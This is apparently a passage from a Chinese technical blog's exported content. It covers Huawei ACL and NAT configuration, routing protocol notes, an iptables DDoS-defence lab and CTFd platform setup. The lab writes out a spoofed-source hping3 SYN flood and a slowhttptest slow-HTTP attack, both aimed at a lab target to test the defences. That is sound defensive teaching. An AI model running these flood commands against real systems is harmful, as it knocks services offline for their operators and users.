id="ACL访问控制列表配置"><a href="#ACL访问控制列表配置" class="headerlink" title="ACL访问控制列表配置"></a>ACL访问控制列表配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei] time-range workday 8:30 to 18:00 working-day    //配置时间段，周一到周五早上8:30到下午18:00</span><br><span class="line"></span><br><span class="line">[Huawei] acl 2000    //启用编号为2000的ACL</span><br><span class="line">[Huawei-acl-basic-2000] rule permit source 192.168.1.10 0 time-range workday    //只允许192.168.1.10这一个用户在工作日可以访问</span><br><span class="line"></span><br><span class="line">[Huawei] user-interface vty 0 4    //进入虚拟接口0-4</span><br><span class="line">[Huawei-ui-vty0-4] acl 2000 inbound    //应用acl</span><br></pre></td></tr></table></figure><h1 id="NAT地址转换配置"><a href="#NAT地址转换配置" class="headerlink" title="NAT地址转换配置"></a>NAT地址转换配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Router] nat address-group 1 2.2.2.100 2.2.2.200    //配置NAT地址池1</span><br><span class="line">[Router] nat address-group 2 2.2.2.80 2.2.2.83    //配置NAT地址池2</span><br><span class="line"></span><br><span class="line">[Router] acl 2000    //配置ACL2000</span><br><span class="line">[Router-acl-basic-2000] rule 5 permit source 192.168.20.0 0.0.0.255</span><br><span class="line">[Router] acl 2001    //配置ACL2001</span><br><span class="line">[Router-acl-basic-2001] rule 5 permit source 10.0.0.0 0.0.0.255</span><br><span class="line"></span><br><span class="line">[Router] interface gigabitethernet 3/0/0</span><br><span class="line">[Router-Gigabitethernet3/0/0] nat outbound 2000 address-group 1 no-pat    //设置ACL2000匹配的源地址，转换为地址池1的地址，并且不开启端口NAT</span><br><span class="line">[Router-Gigabitethernet3/0/0] nat outbound 2001 address-group 2</span><br></pre></td></tr></table></figure><h1 id="静态NAT配置"><a href="#静态NAT配置" class="headerlink" title="静态NAT配置"></a>静态NAT配置</h1><p>每一个私有地址与一个共有地址进行转换。</p><blockquote><p>没啥用，都这么多公网了，还搞啥的一对一的分配</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]interface GigabitEthernet0/0/1</span><br><span class="line">[R1-GigabitEthernet0/0/1]ip address 122.1.2.1 24</span><br><span class="line">[R1-GigabitEthernet0/0/1]nat static global 122.1.2.1 inside 192.168.1.1</span><br><span class="line">[R1-GigabitEthernet0/0/1]nat static global 122.1.2.2 inside 192.168.1.2</span><br></pre></td></tr></table></figure><h1 id="动态NAT配置"><a href="#动态NAT配置" class="headerlink" title="动态NAT配置"></a>动态NAT配置</h1><p>在NAT地址池里选一个地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建地址池</span><br><span class="line">[Huawei]nat address-group group-index start-address end-address</span><br><span class="line"></span><br><span class="line">配置地址转换的ACL规则</span><br><span class="line">[Huawei] acl number</span><br><span class="line">[Huawei-acl-basic-number] rule permit source source-address source-wildcard</span><br><span class="line"></span><br><span class="line">接口识图下配置带地址池的NAT Outbound</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]nat outbound acl-number address-group group-index [no-pat]</span><br></pre></td></tr></table></figure><h2 id="NAPT"><a href="#NAPT" class="headerlink" title="NAPT"></a>NAPT</h2><p>动态NAT选择地址池中的地址，同时也会对端口进行转换。也就是说一个公网地址，可以有多个端口来分配私有地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]nat address-group 1 122.1.2.1 122.1.2.1</span><br><span class="line">[R1]acl 2000</span><br><span class="line">[R1-acl-basic-2000]rule 5 permit source 192.168.1.0 0.0.0.255</span><br><span class="line">[R1-GigabitEthernet0/0/1]nat outbound 2000 address-group 1</span><br></pre></td></tr></table></figure><h1 id="EasyIP"><a href="#EasyIP" class="headerlink" title="EasyIP"></a>EasyIP</h1><p>和NAPT差不多，就是不需要再创建地址池，直接将私网地址转换成网关的出口地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]acl 2000</span><br><span class="line">[R1-acl-basic-2000]rule 5 permit source 192.168.1.0 0.0.0.255</span><br><span class="line">[R1-GigabitEthernet0/0/1]nat outbound 2000</span><br></pre></td></tr></table></figure><h1 id="NAT-Server"><a href="#NAT-Server" class="headerlink" title="NAT Server"></a>NAT Server</h1><p>端口映射，将内网服务器映射到公网</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1-GigabitEthernet0/0/1]nat server protocol tcp global 202.10.10.1 www inside 192.168.1.1 8080</span><br></pre></td></tr></table></figure><h1 id="网络质量探测"><a href="#网络质量探测" class="headerlink" title="网络质量探测"></a>网络质量探测</h1><h2 id="BFD监测网络状态"><a href="#BFD监测网络状态" class="headerlink" title="BFD监测网络状态"></a>BFD监测网络状态</h2><p><img src="/../images/%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%91%BD%E4%BB%A4231022.png"></p><p>如果R2接口坏了，那么R1就会自动删除去往R2的路由</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bfd r1r2 bind peer-ip 12.1.1.2 source-ip 12.1.1.1 one-arm-echo //创建bfd单臂回声。如果没用onew-arm-echo，则R1和R2都需要配置bfd</span><br><span class="line"></span><br><span class="line">ip router-static 0.0.0.0 0 12.1.1.2 track bfd-session bfd r1r2   //在主默认路由上挂载bfd</span><br></pre></td></tr></table></figure><h2 id="NQA监测网络状态"><a href="#NQA监测网络状态" class="headerlink" title="NQA监测网络状态"></a>NQA监测网络状态</h2><p>NQA支持的测试包括多种协议，如http延迟、tcp延迟、DNS错误、ICMP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]nqa test-instance root icmp    //创建一个nqa测试实例，管理账号名为root，测试实例名称为icmp</span><br><span class="line">[R1-nqa-root-icmp]test-type icmp    //测试类型为icmp协议测试</span><br><span class="line">[R1-nqa-root-icmp]frequency 10    //知道连接两次探测间隔为10s</span><br><span class="line">[R1-nqa-root-icmp]probe-count 2    //指定一次探测进行的测试次数</span><br><span class="line">[R1-nqa-root-icmp]destination-address ipv4 12.1.1.2    //测试对端IP地址</span><br><span class="line">[R1-nqa-root-icmp]start now    //启动当前测试实例</span><br></pre></td></tr></table></figure><p>在静态路由或默认路由后加上<code>track NQA</code></p><blockquote><p>ip router-static 0.0.0.0 0 12.1.1.2 track naq root icmp</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络层</title>
      <link href="/8a9d.html"/>
      <url>/8a9d.html</url>
      
        <content type="html"><![CDATA[<h1 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h1><p>可以隔离广播域</p><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><table><thead><tr><th align="center">代码取值</th><th align="center">含义</th><th align="center">代码取值</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">网络不可达</td><td align="center">4</td><td align="center">需要分片但不分片位置位</td></tr><tr><td align="center">1</td><td align="center">主机不可达</td><td align="center">5</td><td align="center">源路由失败</td></tr><tr><td align="center">2</td><td align="center">协议不可达</td><td align="center">6</td><td align="center">目的网络未知</td></tr><tr><td align="center">3</td><td align="center">端口不可达</td><td align="center">7</td><td align="center">目的主机未知</td></tr></tbody></table><h1 id="ARP协议与RARP协议"><a href="#ARP协议与RARP协议" class="headerlink" title="ARP协议与RARP协议"></a>ARP协议与RARP协议</h1><h1 id="IPv4报文结构"><a href="#IPv4报文结构" class="headerlink" title="IPv4报文结构"></a>IPv4报文结构</h1><p><img src="/../images/%E7%BD%91%E7%BB%9C%E5%B1%82231014.png"></p><h1 id="路由协议基本概念"><a href="#路由协议基本概念" class="headerlink" title="路由协议基本概念"></a>路由协议基本概念</h1><h2 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h2><p>距离矢量路由协议，使用Bellman-Ford(贝尔曼-福特)，不可以知道整个网络的拓扑</p><p>基于UDP，520端口发送消息，优先级为100(华为)，经过节点最多15跳，否则目标不可达。<br>使用组播地址进行学习路由：224.0.0.9<br>只学邻居路由信息，每次路由更新最多记录25条路由</p><p>周期更新时间（会产生环路）：30秒<br>垃圾收集时间：120秒<br>失效时间（如果180秒之后没有收到邻居的消息，那么就认为邻居嗝屁了）：180秒</p><p>RIP防环机制：<br>水平分割，毒性反转，触发更新</p><h2 id="OSPF"><a href="#OSPF" class="headerlink" title="OSPF"></a>OSPF</h2><p>链路状态路由协议，采用Dijkstra(迪杰斯特拉)算法，可以知道整个网络的拓扑</p><p>封装在IP层，协议号89，优先级为10</p><p>使用组播地址进行学习路由：224.0.0.5和224.0.0.6<br>使用组播发送hello报文建立邻居</p><p>用DBD报文描述同步的路由信息<br>使用LSR请求对方发送路由信息，使用LSU发送路由信息，并使用LSAck进行确认。<br>路由信息包含重要的LSA信息，路由器收到LSA信息后记录在LSDB表中，然后通过SPF计算最优路由，放入路由表</p><p>网络收敛完成后，邻居之间继续周期性发送hello报文，30s一个周期（P2P和广播类型的网络，周期为10s，其他网络类型，周期为30s）</p><p>area 0 是骨干区域，必须要分配区域，不分配默认就是area0<br>骨干区不能分开，只能有一个骨干区。非骨干区必须和骨干区相连，不可和其他的非骨干区相连<br>可以使用虚链路（vlink）技术解决</p><h3 id="ospf设备类型"><a href="#ospf设备类型" class="headerlink" title="ospf设备类型"></a>ospf设备类型</h3><p>ABR：区域边界路由器，跨越OSPF<strong>不同区域</strong><br>ASBR：自治边界路由器，用于连接非OSPF路由区域<br>OSPF支持路由汇聚，内部路由需要在ABR上做汇聚，外部引入路由则需要在ASBR上配置</p><h2 id="BGP路由协议"><a href="#BGP路由协议" class="headerlink" title="BGP路由协议"></a>BGP路由协议</h2><p>边界网关协议，距离矢量路由协议。</p><p>AS边界路由相连称为EBGP对等体。EGBP和IBGP需要通过TCP，179端口建立邻居关系，通过updata报文传递路由信息。</p><p>周期：60s，发送keepalive探测邻居存活。<br>当BGP出现错误时，会发送notification报文。<br>BGP起初交换整个BGP路由表，后续只更新变化和增量BGP路由</p><h3 id="防环机制"><a href="#防环机制" class="headerlink" title="防环机制"></a>防环机制</h3><p>EBGP通过AS-Path属性防环，IBGP通过水平分割机制防环</p><h1 id="路由表信息"><a href="#路由表信息" class="headerlink" title="路由表信息"></a>路由表信息</h1>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDOS防御之IPTABLES应用</title>
      <link href="/42ea.html"/>
      <url>/42ea.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>攻击机：192.168.92.128，已安装slowhttptest<br>靶机：192.168.92.129，已安装apache httpd，开启iptables服务</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="一、配置iptables"><a href="#一、配置iptables" class="headerlink" title="一、配置iptables"></a>一、配置iptables</h2><p><strong>以下操作使用靶机执行</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启iptables</span></span><br><span class="line">systemctl start iptables</span><br></pre></td></tr></table></figure><p>配置<code>iptables</code>防护规则</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建一个链</span></span><br><span class="line">iptables -N syn-flood</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配传入的TCP SYN数据包, 并将它们传递给名为syn-flood的自定义链</span></span><br><span class="line">iptables -I INPUT -p tcp --syn -j syn-flood</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许端口80的TCP流量通过防火墙</span></span><br><span class="line">iptables -I INPUT 2 -p tcp -m tcp --dport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在自定义链syn-flood中，限制每秒通过的TCP SYN数据包数量，以防止SYN Flood攻击</span></span><br><span class="line">iptables -I syn-flood -p tcp -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 3/s --limit-burst 6 -j RETURN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将名为syn-flood的自定义链的末尾附加一个规则，该规则会拒绝所有匹配到的数据包。</span></span><br><span class="line">iptables -A syn-flood -j REJECT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看规则</span></span><br><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><h1 id="攻击机发起syn攻击"><a href="#攻击机发起syn攻击" class="headerlink" title="攻击机发起syn攻击"></a>攻击机发起syn攻击</h1><p><strong>以下操作使用攻击机执行</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hping3 --rand-source -S -p 80 192.168.92.129 --flood</span><br></pre></td></tr></table></figure><h1 id="观察攻击效果"><a href="#观察攻击效果" class="headerlink" title="观察攻击效果"></a>观察攻击效果</h1><p><strong>以下操作使用靶机执行</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -ant | more</span><br></pre></td></tr></table></figure><p>可以看到服务器一很多的<code>SYN_RECV</code>半连接</p><h1 id="限制同一IP的连接数"><a href="#限制同一IP的连接数" class="headerlink" title="限制同一IP的连接数"></a>限制同一IP的连接数</h1><p><strong>以下操作使用靶机执行</strong></p><p>重启iptables，就会自动删除上面配置的规则</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span><br><span class="line"><span class="comment"># 表示匹配并发连接数量超过16的数据包</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 16 -j REJECT</span><br></pre></td></tr></table></figure><h1 id="使用攻击机，发起slowhttptest攻击"><a href="#使用攻击机，发起slowhttptest攻击" class="headerlink" title="使用攻击机，发起slowhttptest攻击"></a>使用攻击机，发起slowhttptest攻击</h1><p><strong>以下操作使用攻击机执行</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">slowhttptest -c 10000 -B -i 5 -r 200 -u http://192.168.92.129 -p 3 &gt; 1.txt &amp;</span><br></pre></td></tr></table></figure><p>slowhttptest工具执行慢速HTTP攻击测试。模拟攻击者发送大量低速HTTP请求以尝试耗尽服务器资源或导致服务不可用。</p><p>下面是命令的各个部分的解释：</p><blockquote><p><code>slowhttptest</code>: 这是慢速HTTP攻击测试工具的命令。<br><code>-c 10000</code>: 这部分指定要发送的HTTP请求的数量，这里是10000个。<br><code>-B</code>: 这是一个选项，表示在每个请求之间包括一些不完整的请求头，模拟慢速请求。<br><code>-i 5</code>: 这部分指定了请求之间的延迟，以毫秒为单位。在这里，延迟为5毫秒。<br><code>-r 200</code>: 这是一个选项，指定了每个请求的速率，即每秒发送200个请求。<br><code>-u http://192.168.0.116</code>: 这部分指定了目标URL，即HTTP请求将发送到的服务器地址。<br><code>-p 3</code>: 这是一个选项，指定了要使用的HTTP请求方法，这里是3（POST方法）。<br><code>&gt; 1.txt</code>: 这部分将命令的输出重定向到名为<code>1.txt</code>的文本文件中，以保存测试结果。<br><code>&amp;</code>: 这是一个后台运行的符号，它使命令在后台运行，以便您可以继续使用终端。</p></blockquote><p>测试网站是否正常</p><h1 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h1><h2 id="删除iptables的规则"><a href="#删除iptables的规则" class="headerlink" title="删除iptables的规则"></a>删除iptables的规则</h2><h3 id="方法-1-按规则号删除"><a href="#方法-1-按规则号删除" class="headerlink" title="方法 1: 按规则号删除"></a>方法 1: 按规则号删除</h3><p>如果要删除规则号为3的规则，可以执行以下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT 3</span><br></pre></td></tr></table></figure><h3 id="方法-2-按匹配条件删除"><a href="#方法-2-按匹配条件删除" class="headerlink" title="方法 2: 按匹配条件删除"></a>方法 2: 按匹配条件删除</h3><p>如果您不知道规则号，可以使用匹配条件删除规则。这需要您提供要匹配的规则的匹配条件，然后删除匹配的规则。</p><p>例如，如果您知道要删除具有特定源IP地址的规则，可以执行以下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT -s 192.168.1.100 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这将删除匹配源IP地址为<code>192.168.1.100</code>并采取<code>ACCEPT</code>动作的规则。</p><h3 id="方法-3-清空链"><a href="#方法-3-清空链" class="headerlink" title="方法 3: 清空链"></a>方法 3: 清空链</h3><p>如果您想要删除特定链中的所有规则，可以使用<code>-F</code>选项清空该链。例如：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -F INPUT</span><br></pre></td></tr></table></figure><p>这将清空<code>INPUT</code>链中的所有规则。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd添加题目</title>
      <link href="/5419.html"/>
      <url>/5419.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231012.png"></p><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013.png"></p><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-1.png"></p><h1 id="Web动态flag"><a href="#Web动态flag" class="headerlink" title="Web动态flag"></a>Web动态flag</h1><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-2.png"></p><h3 id="配置docker-compose-yml"><a href="#配置docker-compose-yml" class="headerlink" title="配置docker-compose.yml"></a>配置docker-compose.yml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&quot;2&quot;</span></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - FLAG=flag&#123;This_is_s0_simpl3&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-3.png"></p><h3 id="配置Dockerfile"><a href="#配置Dockerfile" class="headerlink" title="配置Dockerfile"></a>配置Dockerfile</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">FROM ctftraining/base_image_nginx_mysql_php_73</span><br><span class="line"></span><br><span class="line">LABEL Author=<span class="string">&quot;jchan &lt;jchan-l@qq.com&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">COPY ./files /tmp/</span><br><span class="line">RUN <span class="built_in">cp</span> -rf /tmp/html /var/www/ \</span><br><span class="line">    &amp;&amp; <span class="built_in">cp</span> -f /tmp/flag.sh /flag.sh \</span><br><span class="line">    &amp;&amp; <span class="built_in">chown</span> -R www-data:www-data /var/www/html \</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-4.png"></p><h3 id="flag-sh、docker-compose-yml和index-php里面的flag要一样才能实现动态flag"><a href="#flag-sh、docker-compose-yml和index-php里面的flag要一样才能实现动态flag" class="headerlink" title="flag.sh、docker-compose.yml和index.php里面的flag要一样才能实现动态flag"></a>flag.sh、docker-compose.yml和index.php里面的flag要一样才能实现动态flag</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/flag&#123;This_is_s0_simpl3&#125;/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/index.php</span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f /flag.sh</span><br></pre></td></tr></table></figure><p><strong>注意：flag在哪个文件，flag.sh第一行的路径就要写flag这个文件的路径</strong></p><h2 id="构建容器"><a href="#构建容器" class="headerlink" title="构建容器"></a>构建容器</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t whereisflag .</span><br><span class="line"><span class="comment"># -t 镜像名字 </span></span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-5.png"></p><h2 id="登录Dockerhub"><a href="#登录Dockerhub" class="headerlink" title="登录Dockerhub"></a>登录Dockerhub</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker login</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-6.png"></p><h2 id="推送镜像到Dockerhub"><a href="#推送镜像到Dockerhub" class="headerlink" title="推送镜像到Dockerhub"></a>推送镜像到Dockerhub</h2><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-7.png"></p><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-8.png"></p><h2 id="配置CTFd"><a href="#配置CTFd" class="headerlink" title="配置CTFd"></a>配置CTFd</h2><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-9.png"></p><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-10.png"></p><h4 id="不需要填写flag"><a href="#不需要填写flag" class="headerlink" title="不需要填写flag"></a>不需要填写flag</h4><p><img src="/../images/CTFd%E6%B7%BB%E5%8A%A0%E9%A2%98%E7%9B%AE231013-11.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF平台搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF平台搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd环境搭建</title>
      <link href="/cfea.html"/>
      <url>/cfea.html</url>
      
        <content type="html"><![CDATA[<h1 id="系统换源"><a href="#系统换源" class="headerlink" title="系统换源"></a>系统换源</h1><h4 id="etc-apt-sources-list"><a href="#etc-apt-sources-list" class="headerlink" title="&#x2F;etc&#x2F;apt&#x2F;sources.list"></a>&#x2F;etc&#x2F;apt&#x2F;sources.list</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#清华大学</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment">#浙大</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment">#东软大学</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br></pre></td></tr></table></figure><h4 id="chmod-666-etc-apt-sources-list"><a href="#chmod-666-etc-apt-sources-list" class="headerlink" title="chmod 666 &#x2F;etc&#x2F;apt&#x2F;sources.list"></a>chmod 666 &#x2F;etc&#x2F;apt&#x2F;sources.list</h4><h4 id="运行-apt-get-update-apt-get-upgrade更新索引以生效"><a href="#运行-apt-get-update-apt-get-upgrade更新索引以生效" class="headerlink" title="运行 apt-get update &amp;&amp; apt-get upgrade更新索引以生效"></a>运行 apt-get update &amp;&amp; apt-get upgrade更新索引以生效</h4><h1 id="Docker环境安装"><a href="#Docker环境安装" class="headerlink" title="Docker环境安装"></a>Docker环境安装</h1><h4 id="apt-install-docker-io"><a href="#apt-install-docker-io" class="headerlink" title="apt install docker.io"></a>apt install docker.io</h4><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-2.png"></p><p>如果启动时发现如下错误请重新跟新源，重新下载</p><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-1.png"></p><h2 id="Docker-compose安装"><a href="#Docker-compose安装" class="headerlink" title="Docker-compose安装"></a>Docker-compose安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.29.2/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-3.png"></p><h2 id="Docker开机启动"><a href="#Docker开机启动" class="headerlink" title="Docker开机启动"></a>Docker开机启动</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h2 id="Docker加速"><a href="#Docker加速" class="headerlink" title="Docker加速"></a>Docker加速</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://si9m86nl.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h1 id="Docker集群设置"><a href="#Docker集群设置" class="headerlink" title="Docker集群设置"></a>Docker集群设置</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker swarm init<span class="comment"># 初始化</span></span><br><span class="line">docker node <span class="built_in">ls</span><span class="comment"># 查看节点ID</span></span><br><span class="line">docker node update --label-add=<span class="string">&#x27;name=linux-1&#x27;</span> $(docker node <span class="built_in">ls</span> -q) <span class="comment"># 添加别名</span></span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-4.png"></p><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-5.png"></p><h1 id="下载CTFd修改版"><a href="#下载CTFd修改版" class="headerlink" title="下载CTFd修改版"></a>下载CTFd修改版</h1><p><strong>博主 @Vicosna 已经对CTFd v3.3.1官方源码进行了更换国内镜像源、添加CTFd-Whale子模块、配置frp网络、设置静态文件CDN加速等工作。</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b frp https://github.com/vicosna/CTFd.git<span class="comment"># 修改版（根目录不建议修改名字）</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ——————————————————————————————————————————————————————</span></span><br><span class="line"><span class="comment"># 如果你访问Github的速度不佳，也可以使用博主提供的CSDN和Gitee版（可选）</span></span><br><span class="line">git <span class="built_in">clone</span> -b https://codechina.csdn.net/vicosna/CTFd.git<span class="comment"># CSDN</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">sed -i <span class="string">&#x27;s/github.com/codechina.csdn.net/g&#x27;</span> .gitmodules<span class="comment"># 修改子模块Url</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br><span class="line"><span class="comment"># ——————————————————————————————————————————————————————</span></span><br><span class="line">git <span class="built_in">clone</span> -b frp https://gitee.com/vicosna/CTFd.git<span class="comment"># Gitee</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">sed -i <span class="string">&#x27;s/github.com/gitee.com/g&#x27;</span> .gitmodules<span class="comment"># 修改子模块Url</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-6.png"></p><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-7.png"></p><h1 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure><p><img src="/../images/CTFd%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA231012-8.png"></p><h1 id="部署容器"><a href="#部署容器" class="headerlink" title="部署容器"></a>部署容器</h1><figure class="highlight sh"><table><tr><td 